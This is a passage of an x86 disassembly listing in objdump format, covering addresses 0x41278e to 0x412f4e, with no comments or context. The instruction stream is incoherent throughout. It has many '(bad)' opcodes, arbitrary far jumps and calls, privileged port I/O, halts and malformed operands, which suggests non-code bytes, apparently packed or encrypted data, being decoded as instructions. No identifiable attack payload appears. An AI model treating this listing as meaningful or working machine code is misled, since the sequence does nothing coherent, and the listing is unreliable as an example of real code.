  41278e:	or     eax,0x5da51a84
  412793:	xor    DWORD PTR [eax-0x7f],esi
  412796:	fs es ins DWORD PTR es:[edi],dx
  412799:	mov    dh,0x20
  41279b:	xlat   BYTE PTR ds:[ebx]
  41279c:	pop    ss
  41279d:	jge    0x41278d
  41279f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127a0:	and    DWORD PTR ds:[eax+eax*1],0x3de3f917
  4127a8:	mov    bh,0x6b
  4127aa:	ins    BYTE PTR es:[edi],dx
  4127ab:	lahf   
  4127ac:	outs   dx,DWORD PTR ds:[esi]
  4127ad:	pop    ebx
  4127ae:	jmp    0x412780
  4127b0:	xchg   ebp,eax
  4127b1:	pop    edi
  4127b2:	aad    0xb5
  4127b4:	mov    dh,0x4f
  4127b6:	outs   dx,BYTE PTR ds:[esi]
  4127b7:	mov    edx,0x380aaa7c
  4127bc:	fnstcw WORD PTR [edx+0x57a3cc25]
  4127c2:	cmp    al,0xbe
  4127c4:	jl     0x41274d
  4127c6:	mov    ds:0xfb9ee3a0,al
  4127cb:	adc    eax,DWORD PTR [esi+0x1e00cd44]
  4127d1:	xlat   BYTE PTR ds:[ebx]
  4127d2:	rcr    BYTE PTR [ebp+0x36412a40],1
  4127d8:	xor    BYTE PTR es:[ecx-0x67],cl
  4127dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127dd:	hlt    
  4127de:	adc    ecx,DWORD PTR ds:0x5134f3e3
  4127e4:	loop   0x4127d2
  4127e6:	imul   edi,DWORD PTR [ebx-0x7a6e3b7],0x53
  4127ed:	shl    BYTE PTR [ebx],cl
  4127ef:	jns    0x412854
  4127f1:	aam    0x4f
  4127f3:	push   ecx
  4127f4:	scas   al,BYTE PTR es:[edi]
  4127f5:	mov    eax,ds:0xa5e168d9
  4127fa:	fisubr DWORD PTR [ebx-0x29d41122]
  412800:	(bad)  
  412801:	rol    BYTE PTR [edi],0xf6
  412804:	in     al,dx
  412805:	or     DWORD PTR [ecx+0x6f],ecx
  412808:	scas   eax,DWORD PTR es:[edi]
  412809:	sti    
  41280a:	sbb    al,0x8a
  41280c:	xor    ebx,DWORD PTR [esp+ebp*8]
  41280f:	cmp    edx,ebp
  412811:	inc    esp
  412812:	(bad)  
  412813:	and    BYTE PTR [esi-0x18],ah
  412816:	sar    BYTE PTR [edi+0x49],1
  412819:	xchg   esi,eax
  41281a:	ins    BYTE PTR es:[edi],dx
  41281b:	push   ebx
  41281c:	sbb    al,0x64
  41281e:	inc    edi
  41281f:	bound  edi,QWORD PTR [ebx]
  412821:	imul   esp,DWORD PTR [ebp+0x46],0xfffffffb
  412825:	push   edi
  412826:	cdq    
  412827:	adc    DWORD PTR [ebp-0x3af604a6],eax
  41282d:	fst    DWORD PTR [edx]
  41282f:	in     al,dx
  412830:	ja     0x412869
  412832:	or     ecx,DWORD PTR [ecx+0x25c7f13f]
  412838:	push   0xc75597ef
  41283d:	fild   DWORD PTR ds:0x7bc998f
  412843:	mov    eax,ds:0x89fcaa7b
  412848:	aam    0xc6
  41284a:	(bad)
  41284f:	(bad)  
  412850:	mov    ds:0xc86b1061,al
  412855:	or     edi,DWORD PTR [ecx+0x18]
  412858:	out    dx,eax
  412859:	mov    al,BYTE PTR [esi+0x6b]
  41285c:	js     0x41284f
  41285e:	and    DWORD PTR [ebp+0x184d2edc],eax
  412864:	adc    BYTE PTR [edx*4+0x190ffe13],0x78
  41286c:	jle    0x412812
  41286e:	xor    edi,DWORD PTR [ebx-0x7b]
  412871:	stc    
  412872:	sbb    DWORD PTR [eax],ecx
  412874:	push   0x25
  412876:	pop    edx
  412877:	add    DWORD PTR [esi+0x894203a],ebx
  41287d:	call   0x8727:0xa284d736
  412884:	cli    
  412885:	stos   DWORD PTR es:[edi],eax
  412886:	ins    BYTE PTR es:[edi],dx
  412887:	lds    eax,FWORD PTR ds:0x6e0edaaa
  41288d:	pop    edx
  41288e:	cmp    dl,BYTE PTR [eax+0x4411d8b4]
  412894:	fidivr WORD PTR [eax]
  412896:	adc    eax,0xfd5f1c3
  41289b:	jg     0x41290d
  41289d:	mov    ds:0xbed2d123,eax
  4128a2:	jp     0x412895
  4128a4:	mov    esi,0x2043e3a7
  4128a9:	mov    ebp,0x61d7d1cd
  4128ae:	sub    eax,DWORD PTR [ecx-0x6]
  4128b1:	mov    BYTE PTR [ecx],bh
  4128b3:	lea    ebx,[edi]
  4128b5:	test   ebx,0x92151a49
  4128bb:	dec    esi
  4128bc:	(bad)  
  4128bd:	mov    bh,0xf3
  4128bf:	scas   al,BYTE PTR es:[edi]
  4128c0:	fimul  DWORD PTR [edi+esi*1+0x8]
  4128c4:	xchg   ebx,eax
  4128c5:	fwait
  4128c6:	jmp    0x4128a2
  4128c8:	cmp    ebx,DWORD PTR [edx]
  4128ca:	push   edi
  4128cb:	call   0xe0d9b642
  4128d0:	fisttp QWORD PTR [esi+0x1c]
  4128d3:	mov    ebx,0x9f77dc43
  4128d8:	outs   dx,BYTE PTR ds:[esi]
  4128d9:	add    DWORD PTR [ebx-0x2c909365],esi
  4128df:	and    BYTE PTR [ebp+0x2f49c2ef],dl
  4128e5:	idiv   eax
  4128e7:	inc    ecx
  4128e8:	lods   al,BYTE PTR ds:[esi]
  4128e9:	call   0x5bdbb87b
  4128ee:	popf   
  4128ef:	jmp    0x3761656a
  4128f4:	not    BYTE PTR [edi+ebp*1]
  4128f7:	jbe    0x412910
  4128f9:	adc    eax,esi
  4128fb:	jecxz  0x4128c4
  4128fd:	aad    0x9f
  4128ff:	(bad)  
  412900:	repz push cs
  412902:	js     0x41295c
  412904:	dec    edx
  412905:	lods   eax,DWORD PTR ds:[esi]
  412906:	and    bh,al
  412908:	rcl    DWORD PTR [esi],0xd8
  41290b:	ss sti 
  41290d:	out    dx,al
  41290e:	or     BYTE PTR [edx-0xe912c66],ch
  412914:	push   esi
  412915:	mov    dl,0x10
  412917:	(bad)  
  412918:	fs cs cli 
  41291b:	pop    es
  41291c:	jns    0x412983
  41291e:	jbe    0x4128b6
  412920:	push   esp
  412921:	mov    ds:0xbd3b5028,al
  412926:	sub    ebx,DWORD PTR [ebx+0x55d2e6f6]
  41292c:	stos   BYTE PTR es:[edi],al
  41292d:	mov    ds:0x7fef3ef5,al
  412932:	mov    bl,BYTE PTR [edx+0x765748a5]
  412938:	adc    cl,BYTE PTR [ebx]
  41293a:	sbb    BYTE PTR [ebx],0xff
  41293d:	fwait
  41293e:	in     al,dx
  41293f:	popa   
  412940:	aaa    
  412941:	mov    ebx,0x8a93215d
  412946:	jbe    0x4128cc
  412948:	jnp    0x412999
  41294a:	push   cs
  41294b:	and    edx,eax
  41294d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41294e:	dec    esp
  41294f:	dec    ebp
  412950:	or     eax,0x69c609ac
  412955:	cmp    DWORD PTR [ecx+0x15590fb6],esi
  41295b:	div    BYTE PTR [ecx-0x3a4235f4]
  412961:	xor    DWORD PTR [ebx+0x67a70728],eax
  412967:	add    DWORD PTR [eax-0x6],ebx
  41296a:	shl    BYTE PTR [ecx+0x26e9abc6],1
  412970:	push   esi
  412971:	ficomp DWORD PTR [esi-0x4e8b8742]
  412977:	push   eax
  412978:	mov    dl,BYTE PTR [eax-0x45408650]
  41297e:	jmp    0x258b:0xf7acc112
  412985:	or     BYTE PTR [edi+esi*8+0x587f7024],0x13
  41298d:	dec    ebx
  41298e:	adc    al,0xb2
  412990:	and    al,BYTE PTR [ebx]
  412992:	into   
  412993:	mov    DWORD PTR [edx],ebx
  412995:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412996:	pop    edi
  412997:	sti    
  412998:	mov    eax,0xa0c9e6c3
  41299d:	mov    dh,0x44
  41299f:	call   0x5c689e4c
  4129a4:	pop    edi
  4129a5:	call   0xbccb5942
  4129aa:	or     DWORD PTR [ebx+0x32],0xffffffe6
  4129ae:	int3   
  4129af:	in     al,dx
  4129b0:	imul   edx,DWORD PTR [eax+0x43],0xffffff9b
  4129b4:	stos   BYTE PTR es:[edi],al
  4129b5:	(bad)  
  4129b6:	sub    eax,0x18872a12
  4129bb:	mov    ch,0xcf
  4129bd:	mov    ah,0x60
  4129bf:	out    0x7e,al
  4129c1:	adc    BYTE PTR ds:0xab080bd0,bh
  4129c7:	adc    DWORD PTR [ebx+0x73],esi
  4129ca:	inc    edi
  4129cb:	dec    ebx
  4129cc:	(bad)  
  4129ce:	mov    dh,0xd1
  4129d0:	and    al,0xe4
  4129d2:	cmp    al,0xc8
  4129d4:	(bad)  
  4129d5:	ins    DWORD PTR es:[edi],dx
  4129d6:	cli    
  4129d7:	imul   ecx,DWORD PTR [ebx],0xf47b5336
  4129dd:	test   BYTE PTR ds:0x62e09c,ah
  4129e3:	sahf   
  4129e4:	pop    esp
  4129e5:	scas   al,BYTE PTR es:[edi]
  4129e6:	mov    bl,0x1b
  4129e8:	cmc    
  4129e9:	loope  0x412972
  4129eb:	out    0x52,al
  4129ed:	mov    eax,0x3be1b9f9
  4129f2:	jbe    0x412a71
  4129f4:	test   al,0x45
  4129f6:	cs lock cmc 
  4129f9:	dec    esp
  4129fa:	cs into 
  4129fc:	cmp    al,0xe2
  4129fe:	call   0x5dd6:0xeb20c662
  412a05:	loopne 0x4129d7
  412a07:	dec    ebp
  412a08:	or     al,0x11
  412a0a:	inc    esp
  412a0b:	push   ds
  412a0c:	sahf   
  412a0d:	(bad)  
  412a0e:	int    0x66
  412a10:	add    al,0x15
  412a12:	mov    al,0xea
  412a14:	(bad)  
  412a15:	ins    BYTE PTR es:[edi],dx
  412a16:	es inc esp
  412a18:	imul   ebp,DWORD PTR [eax+0x21],0x888a19fd
  412a1f:	jbe    0x412a3c
  412a21:	ja     0x412a92
  412a23:	sub    DWORD PTR [esi-0x42b321f1],ecx
  412a29:	jmp    0xe19c2599
  412a2e:	(bad)  
  412a2f:	aad    0xc0
  412a31:	mov    eax,ds:0x6ed43bbd
  412a36:	inc    eax
  412a37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a38:	pop    edi
  412a39:	xchg   edi,eax
  412a3a:	fistp  WORD PTR [eax-0x5f]
  412a3d:	ror    ebp,1
  412a3f:	lods   eax,DWORD PTR ds:[esi]
  412a40:	outs   dx,BYTE PTR ds:[esi]
  412a41:	push   0x43
  412a43:	pop    esp
  412a44:	in     eax,0x3e
  412a46:	test   DWORD PTR [ebp+0x4179c5b1],ebx
  412a4c:	pminub mm0,mm7
  412a4f:	sahf   
  412a50:	shl    dh,0x9c
  412a53:	es mov dh,bl
  412a56:	xor    esp,ebp
  412a58:	ret    0xfdb7
  412a5b:	adc    DWORD PTR [edi+0x2dd7799b],0x3e542317
  412a65:	(bad)  
  412a66:	leave  
  412a67:	cwde   
  412a68:	inc    ecx
  412a69:	loop   0x4129f6
  412a6b:	dec    eax
  412a6c:	test   dl,dh
  412a6e:	cld    
  412a6f:	jl     0x412aa8
  412a71:	cwde   
  412a72:	jmp    0x412af1
  412a74:	mov    eax,0x68e5f359
  412a79:	sar    ebp,1
  412a7b:	adc    DWORD PTR [edi],ebp
  412a7d:	(bad)  
  412a7e:	loop   0x412ae8
  412a80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a81:	and    edx,ebx
  412a83:	jg     0x412a79
  412a85:	push   0x3e
  412a87:	loope  0x412ab3
  412a89:	imul   edi,DWORD PTR [edi-0x5997dee0],0xffffff8f
  412a90:	dec    edi
  412a91:	push   eax
  412a92:	cwde   
  412a93:	push   ebp
  412a94:	inc    ecx
  412a95:	pop    ebp
  412a96:	sub    ch,ch
  412a98:	es (bad) 
  412a9a:	push   ss
  412a9b:	dec    edi
  412a9c:	mov    eax,ds:0xa5a10369
  412aa1:	push   0x76c9ced0
  412aa6:	and    al,BYTE PTR [ebx+edi*1+0x5c6ba61b]
  412aad:	bound  esi,QWORD PTR ds:0x41cbc42e
  412ab3:	outs   dx,BYTE PTR ds:[esi]
  412ab4:	aas    
  412ab5:	jo     0x412aa7
  412ab7:	sti    
  412ab8:	into   
  412ab9:	fldcw  WORD PTR [esi+0x60]
  412abc:	in     eax,dx
  412abd:	mov    ?,esp
  412abf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ac0:	xchg   ebp,eax
  412ac1:	shr    DWORD PTR ds:0x7de9a190,cl
  412ac7:	push   0x70459df6
  412acc:	dec    eax
  412acd:	std    
  412ace:	add    ecx,DWORD PTR [ebp-0x2]
  412ad1:	xor    DWORD PTR [ecx],ecx
  412ad3:	dec    ebx
  412ad4:	in     eax,dx
  412ad5:	out    0x4f,eax
  412ad7:	jmp    0x2e2c67e9
  412adc:	mov    al,0x64
  412ade:	sbb    ecx,DWORD PTR [edi]
  412ae0:	mov    dl,0x39
  412ae2:	repnz sbb al,0x1f
  412ae5:	cli    
  412ae6:	pop    edi
  412ae7:	push   ds
  412ae8:	mov    ecx,0x40b3ecce
  412aed:	jbe    0x412b38
  412aef:	loop   0x412b4e
  412af1:	dec    edi
  412af2:	mov    ds:0x181b0e65,eax
  412af7:	test   eax,0x5fefd799
  412afc:	mov    esi,0x3ac7b60b
  412b01:	inc    ebp
  412b02:	gs test al,0x90
  412b05:	push   esp
  412b06:	mov    dl,BYTE PTR [eax-0x4367d2f9]
  412b0c:	aam    0xde
  412b0e:	mov    esp,0xc929ff96
  412b13:	adc    eax,0x498a35bc
  412b18:	pop    esp
  412b19:	jno    0x412b40
  412b1b:	ja     0x412b03
  412b1d:	xor    ah,BYTE PTR [ebx]
  412b1f:	pop    ds
  412b20:	or     BYTE PTR [ecx-0x65],dh
  412b23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b24:	cmp    edx,DWORD PTR [ecx-0x1e]
  412b27:	lods   eax,DWORD PTR ds:[esi]
  412b28:	mov    esp,ecx
  412b2a:	imul   eax,DWORD PTR [edi],0x2793e405
  412b30:	lds    ebx,FWORD PTR [ebx]
  412b32:	jge    0x412b33
  412b34:	outs   dx,DWORD PTR fs:[esi]
  412b36:	dec    ebp
  412b37:	imul   esi,DWORD PTR [eax],0x8446b8e5
  412b3d:	shr    BYTE PTR [ecx],cl
  412b3f:	mov    eax,ds:0xd18de095
  412b44:	mov    ch,0x8b
  412b46:	out    dx,eax
  412b47:	pop    eax
  412b48:	cmp    cl,ah
  412b4a:	push   ecx
  412b4b:	cmp    BYTE PTR [edi-0x3e],0x70
  412b4f:	dec    eax
  412b50:	aam    0xc8
  412b52:	(bad)
  412b56:	fnstcw WORD PTR [edx]
  412b58:	cmp    al,0xe0
  412b5a:	pop    esp
  412b5b:	lock xchg edx,eax
  412b5d:	or     esp,DWORD PTR [ecx+0x3fbd7299]
  412b63:	test   eax,0x62c1efde
  412b68:	pop    esp
  412b69:	and    eax,0xccbe3020
  412b6e:	mov    eax,ds:0xc98b9767
  412b74:	mov    ah,0x3c
  412b76:	add    esi,eax
  412b78:	push   ds
  412b79:	sub    ecx,DWORD PTR [ecx-0x31962ae1]
  412b7f:	xchg   esp,eax
  412b80:	loope  0x412b5a
  412b82:	mov    bh,al
  412b84:	int3   
  412b85:	pop    edi
  412b86:	dec    ecx
  412b87:	cmp    BYTE PTR [esi+0x51],ah
  412b8a:	adc    DWORD PTR [edx-0x2c],esi
  412b8d:	push   eax
  412b8e:	jno    0x412b97
  412b90:	test   DWORD PTR [edi+0x61fcda3],ebp
  412b96:	arpl   WORD PTR [ecx+0x7ee4ddf3],di
  412b9c:	mov    ebp,0x87eb7247
  412ba1:	jno    0x412bbb
  412ba3:	sbb    al,0xf9
  412ba5:	lds    eax,FWORD PTR [esi+0x6d739b5]
  412bab:	aaa    
  412bac:	dec    ebx
  412bad:	jae    0x412ba4
  412baf:	fs ret 
  412bb1:	adc    eax,0x2273647b
  412bb6:	sub    bh,cl
  412bb8:	pop    ecx
  412bb9:	lods   al,BYTE PTR ds:[esi]
  412bba:	mov    edi,0xbc477cf2
  412bbf:	jns    0x412c38
  412bc1:	jle    0x412b7f
  412bc3:	shl    ah,0x4
  412bc6:	cmp    BYTE PTR [ebp+0x0],dl
  412bc9:	pop    eax
  412bca:	or     ch,bl
  412bcc:	dec    esi
  412bcd:	sbb    ebp,edi
  412bcf:	cmp    BYTE PTR [eax],ah
  412bd1:	fild   WORD PTR [esi-0x13]
  412bd4:	xor    al,0xc1
  412bd6:	inc    edx
  412bd7:	repnz mov ds:0xa3edd43e,eax
  412bdd:	cmp    al,0x71
  412bdf:	fidiv  WORD PTR [ebp+esi*8+0x7152dadf]
  412be6:	seto   BYTE PTR [ebp+0x2e]
  412bea:	inc    ebx
  412beb:	stos   BYTE PTR es:[edi],al
  412bec:	jnp    0x412b96
  412bee:	(bad)  
  412bef:	sub    cl,BYTE PTR [eax]
  412bf1:	or     al,0x6c
  412bf3:	aam    0x4d
  412bf5:	lods   al,BYTE PTR ds:[esi]
  412bf6:	fs fwait
  412bf8:	xchg   edi,eax
  412bf9:	rol    BYTE PTR ds:0xe7cdc621,cl
  412bff:	add    esp,esp
  412c01:	ins    DWORD PTR es:[edi],dx
  412c02:	pop    ss
  412c03:	mov    al,ds:0xe61da7fc
  412c09:	retf   
  412c0a:	inc    ecx
  412c0b:	imul   DWORD PTR [esi+0x11]
  412c0e:	retf   0x474c
  412c11:	ja     0x412bbf
  412c13:	in     al,dx
  412c14:	xchg   ecx,eax
  412c15:	cld    
  412c16:	inc    ecx
  412c17:	push   eax
  412c18:	mov    eax,0xfc24bfdc
  412c1d:	shr    BYTE PTR [edi+0x5bc3d2e4],1
  412c23:	xor    DWORD PTR [edx+0x90c16c8],edi
  412c29:	cmp    BYTE PTR [ecx+0x2579e1aa],dh
  412c2f:	and    al,0xe7
  412c31:	jb     0x412c42
  412c33:	mov    esp,0x9b320ca2
  412c38:	cdq    
  412c39:	adc    BYTE PTR ds:0x7c5a7e14,dh
  412c3f:	add    bl,0x39
  412c42:	mov    al,ds:0xdd905eb7
  412c47:	inc    ebx
  412c48:	std    
  412c49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c4a:	mov    bh,0xf8
  412c4d:	or     BYTE PTR [ecx-0x5a],ch
  412c50:	cmp    BYTE PTR [ebp+0x41a462f6],bh
  412c56:	retf   
  412c57:	mov    DWORD PTR [ecx+0x11c40ad],edi
  412c5d:	mov    BYTE PTR [edi-0x1c],al
  412c60:	int    0x27
  412c62:	inc    ebp
  412c63:	retf   
  412c64:	(bad)  
  412c65:	jle    0x412bf8
  412c67:	retf   0x5d80
  412c6a:	sbb    BYTE PTR [ebx-0x73],bh
  412c6d:	cmp    eax,0x7dba94d2
  412c72:	jge    0x412c0c
  412c74:	and    ah,al
  412c76:	sbb    dh,BYTE PTR [ebp-0x6a9107f9]
  412c7c:	sub    al,0x4c
  412c7e:	fidiv  WORD PTR [ebx+0x7ce35bec]
  412c84:	ret    
  412c85:	fwait
  412c86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c87:	fcom   DWORD PTR [edi-0x465a5ee3]
  412c8d:	and    edi,DWORD PTR [edx]
  412c8f:	cmovne ecx,DWORD PTR [ecx+0x7f]
  412c93:	jg     0x412d06
  412c95:	stos   DWORD PTR es:[edi],eax
  412c96:	xchg   edx,eax
  412c97:	sbb    ebp,DWORD PTR [eax]
  412c99:	sbb    eax,DWORD PTR [ebx+0x3108e09b]
  412c9f:	mov    ah,BYTE PTR [edx+ebp*2+0x376e2648]
  412ca6:	(bad)  
  412ca8:	and    dl,BYTE PTR [esi+0x48]
  412cab:	hlt    
  412cac:	dec    edi
  412cad:	xchg   esp,eax
  412cae:	xchg   esp,eax
  412caf:	push   es
  412cb0:	fisubr DWORD PTR [edx-0x2]
  412cb3:	lock test BYTE PTR [eax+0x24],0xc4
  412cb8:	hlt    
  412cb9:	mov    eax,ebx
  412cbb:	cmp    eax,0x184fd658
  412cc0:	iret   
  412cc1:	mov    BYTE PTR [edx],bl
  412cc3:	out    dx,eax
  412cc4:	mov    eax,0x661badf
  412cc9:	and    DWORD PTR [edi],esp
  412ccb:	aas    
  412ccc:	pop    edi
  412ccd:	retf   0xc89a
  412cd0:	xchg   esp,eax
  412cd1:	jb     0x412c62
  412cd3:	into   
  412cd4:	imul   esi,esp,0x36f82130
  412cda:	xchg   edx,eax
  412cdb:	fs mov ch,0x64
  412cde:	xchg   DWORD PTR [eax-0x72312e7c],ebp
  412ce4:	(bad)  
  412ce5:	data16 jno 0x412d49
  412ce8:	push   ss
  412ce9:	mov    ds:0x4dc7b745,al
  412cee:	into   
  412cef:	aad    0xae
  412cf1:	addr16 fwait
  412cf3:	repz scas al,BYTE PTR es:[edi]
  412cf5:	je     0x412c8e
  412cf7:	es daa 
  412cf9:	outs   dx,BYTE PTR ds:[esi]
  412cfa:	arpl   WORD PTR [edi+eax*2+0x20d494bb],dx
  412d01:	sbb    al,BYTE PTR ds:0x3c7d20f6
  412d07:	pop    esp
  412d08:	xchg   esp,eax
  412d09:	mov    bh,0xc6
  412d0b:	or     DWORD PTR [ecx],esp
  412d0d:	loop   0x412d53
  412d0f:	jno    0x412ccb
  412d11:	aaa    
  412d12:	sub    eax,0x8b018d28
  412d17:	dec    ebp
  412d18:	xchg   ebx,eax
  412d19:	push   esp
  412d1a:	adc    edx,DWORD PTR [ebp-0xb]
  412d1d:	shl    BYTE PTR [ecx-0x44b724c],0x95
  412d24:	push   0x9740c1bc
  412d29:	inc    eax
  412d2a:	addr16 mov eax,ds:0xd2f2
  412d2e:	(bad)  [ebp+0x3906d090]
  412d34:	std    
  412d35:	push   0x11772d65
  412d3a:	xchg   DWORD PTR [eax+0x57959826],esi
  412d40:	push   0x1a
  412d42:	lahf   
  412d43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d44:	dec    esi
  412d45:	cwde   
  412d46:	adc    BYTE PTR [ecx+ebx*2-0x56],cl
  412d4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d4b:	inc    ebp
  412d4c:	dec    edx
  412d4d:	dec    ebx
  412d4e:	or     eax,0xfae24ee9
  412d53:	scas   eax,DWORD PTR es:[edi]
  412d54:	cmp    al,0xb3
  412d56:	xchg   edi,eax
  412d57:	pop    ebx
  412d58:	bound  esp,QWORD PTR [ecx+0x8a74c82]
  412d5e:	outs   dx,BYTE PTR ds:[esi]
  412d5f:	pop    ebx
  412d60:	clc    
  412d61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d62:	jmp    0x27a9:0x94459a01
  412d69:	test   BYTE PTR [edi+0x570b7b43],dl
  412d6f:	dec    edx
  412d70:	hlt    
  412d71:	sti    
  412d72:	sbb    eax,ebx
  412d74:	mov    ebp,0xdd827619
  412d79:	jne    0x412d2f
  412d7b:	xchg   edx,eax
  412d7c:	xor    al,0xad
  412d7e:	in     eax,dx
  412d7f:	aam    0x8
  412d81:	popf   
  412d82:	jle    0x412d9b
  412d84:	ins    DWORD PTR es:[edi],dx
  412d85:	aaa    
  412d86:	dec    edx
  412d87:	inc    ecx
  412d88:	outs   dx,DWORD PTR ds:[esi]
  412d89:	push   ds
  412d8a:	mov    dl,0x28
  412d8c:	jae    0x412da2
  412d8e:	inc    ebp
  412d8f:	sub    eax,0xb247a473
  412d94:	ds lahf 
  412d96:	mov    edx,ebp
  412d98:	jno    0x412dbd
  412d9a:	pusha  
  412d9b:	fdivr  QWORD PTR [edi+edi*4-0x25]
  412d9f:	stos   BYTE PTR es:[edi],al
  412da0:	push   0x41
  412da2:	add    BYTE PTR [ebx+0xe85a0ff],0x8c
  412da9:	fmul   QWORD PTR [ebx+0x19]
  412dac:	pop    ebx
  412dad:	sahf   
  412dae:	das    
  412daf:	and    DWORD PTR ds:0x1118ebea,edi
  412db5:	xchg   edi,eax
  412db6:	or     eax,0xe605ccbe
  412dbb:	retf   0x5a8b
  412dbe:	xchg   edx,eax
  412dbf:	push   edi
  412dc0:	adc    bl,0xc0
  412dc3:	ja     0x412d80
  412dc5:	add    eax,0x28e02dc5
  412dca:	scas   eax,DWORD PTR es:[edi]
  412dcb:	sub    al,0x52
  412dcd:	out    0x48,al
  412dcf:	por    mm3,QWORD PTR [ebp-0x36]
  412dd3:	xchg   BYTE PTR [edx+0x37],al
  412dd6:	or     bl,0xaf
  412dd9:	xor    al,0x13
  412ddb:	ficom  DWORD PTR [eax]
  412ddd:	lods   eax,DWORD PTR ds:[esi]
  412dde:	pop    fs
  412de0:	scas   al,BYTE PTR es:[edi]
  412de1:	or     DWORD PTR [edi],ecx
  412de3:	push   eax
  412de4:	(bad)  
  412de5:	hlt    
  412de6:	jo     0x412e15
  412de8:	mov    ds:0xe5cf75d0,eax
  412ded:	stc    
  412dee:	push   0xffffffb6
  412df0:	pop    ebp
  412df1:	jp     0x412dc9
  412df3:	pop    ss
  412df4:	cmp    al,0xff
  412df6:	imul   eax,DWORD PTR [edi+0x73],0xfffffff8
  412dfa:	adc    cl,BYTE PTR [edx+0x645551f1]
  412e00:	add    BYTE PTR [esi+0x4],0x44
  412e04:	lock in al,0xdb
  412e07:	add    eax,0xb10a3dd2
  412e0c:	clc    
  412e0d:	aad    0x66
  412e0f:	cmp    DWORD PTR [ebp-0x70d95951],0x6e
  412e16:	ret    0xc800
  412e19:	mov    DWORD PTR [eax-0xf29506e],esp
  412e1f:	mov    edi,0xced1a1ce
  412e24:	int3   
  412e25:	or     BYTE PTR [ecx+0x0],0x9a
  412e29:	cwde   
  412e2a:	rol    edi,1
  412e2c:	add    ch,BYTE PTR [esi+0x5f4649df]
  412e32:	cmc    
  412e33:	sahf   
  412e34:	adc    eax,ebp
  412e36:	cmp    DWORD PTR [esp+edx*2],ebp
  412e39:	xor    al,0x5e
  412e3b:	xor    DWORD PTR [ecx],ecx
  412e3d:	cmp    esi,DWORD PTR [eax+0x4ceae3c]
  412e43:	sbb    al,0x86
  412e45:	sbb    edi,DWORD PTR [ecx-0x24]
  412e48:	repnz xor cl,BYTE PTR [ebx]
  412e4b:	jmp    0x4943:0xc73172a2
  412e52:	inc    edi
  412e53:	in     eax,0x23
  412e55:	mov    BYTE PTR [esi+0x5a],bl
  412e58:	mov    ds:0x81e56a25,al
  412e5d:	push   eax
  412e5e:	jbe    0x412e00
  412e60:	pushf  
  412e61:	push   ebx
  412e62:	jns    0x412ea0
  412e64:	mov    DWORD PTR [ecx-0x5f],esp
  412e67:	cdq    
  412e68:	xor    DWORD PTR [ecx+0x12c9e979],ebx
  412e6e:	lds    eax,FWORD PTR [edx]
  412e70:	or     esi,DWORD PTR [ebp-0x6f00a5e1]
  412e76:	pop    ebp
  412e77:	pop    edi
  412e78:	lock pop ecx
  412e7a:	(bad)  
  412e7b:	out    dx,al
  412e7c:	add    ah,BYTE PTR [eax+esi*1+0x682ccd0a]
  412e83:	or     BYTE PTR [ebx-0x45db9e82],dh
  412e89:	call   0xcb59093d
  412e8e:	and    esi,DWORD PTR [ebx-0x2c]
  412e91:	ins    DWORD PTR es:[edi],dx
  412e92:	rcr    eax,cl
  412e94:	scas   al,BYTE PTR es:[edi]
  412e95:	inc    ebx
  412e96:	jmp    0x4a2b:0xb9e52556
  412e9d:	jns    0x412ec8
  412e9f:	cmp    BYTE PTR [esp+edi*1],0xed
  412ea3:	int3   
  412ea4:	imul   ecx,ecx,0x1d5c43fe
  412eaa:	ret    0xcf6e
  412ead:	cmc    
  412eae:	in     eax,0x52
  412eb0:	push   ebx
  412eb1:	jmp    0x412ea4
  412eb3:	jecxz  0x412eaf
  412eb5:	mov    ds:0xa43ba851,eax
  412eba:	lock arpl WORD PTR [ebp-0x59],cx
  412ebe:	aad    0xad
  412ec0:	es adc dl,cl
  412ec3:	adc    eax,0x388de5f1
  412ec8:	inc    ebp
  412ec9:	add    eax,0xdd62543e
  412ece:	pop    ebp
  412ecf:	stos   BYTE PTR es:[edi],al
  412ed0:	fsubr  QWORD PTR [edx+0x36c81974]
  412ed6:	xchg   BYTE PTR ss:[ebp-0x80],dh
  412eda:	mov    ds,WORD PTR [ebp+0x76af9781]
  412ee0:	mov    ds:0xd5e3dd4d,eax
  412ee5:	or     al,0x7b
  412ee7:	out    dx,al
  412ee8:	fcomi  st,st(5)
  412eea:	sub    al,0x92
  412eec:	xor    BYTE PTR [eax+0x6b369ed2],cl
  412ef2:	jmp    0x412f08
  412ef4:	sub    BYTE PTR [edx+ecx*8-0x5a],ah
  412ef8:	sbb    ebp,DWORD PTR [edx+0x20]
  412efb:	dec    esp
  412efc:	mov    dl,0x3d
  412efe:	addr16 (bad) 
  412f00:	jmp    0x1a55:0xdea17bb3
  412f07:	imul   ebx,DWORD PTR [edx+ebx*8+0x45],0xffffffb8
  412f0c:	cmp    eax,0x12a2ca85
  412f11:	sub    ah,BYTE PTR [edi-0x39b3462d]
  412f17:	fild   QWORD PTR [ebp+esi*4-0x2de1f354]
  412f1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f1f:	and    DWORD PTR [ecx],edx
  412f21:	gs inc ecx
  412f23:	xchg   ebp,eax
  412f24:	sbb    esp,ecx
  412f26:	mov    ?,WORD PTR [ebx+0x2e]
  412f29:	and    eax,DWORD PTR [esi]
  412f2b:	mov    ah,0x25
  412f2d:	(bad)  
  412f2e:	push   edi
  412f30:	test   eax,0x9443eaba
  412f35:	popf   
  412f36:	ja     0x412ec1
  412f38:	sbb    al,0x2c
  412f3a:	fcom   st(4)
  412f3c:	pushf  
  412f3d:	xchg   ecx,eax
  412f3e:	mov    al,ds:0x365b673e
  412f43:	sub    ch,BYTE PTR [edx+edx*2]
  412f46:	pop    edx
  412f47:	inc    edx
  412f48:	lahf   
  412f49:	mov    WORD PTR [edi+eax*4],fs
  412f4c:	repnz in al,dx
  412f4e:	xchg   esi,ebp
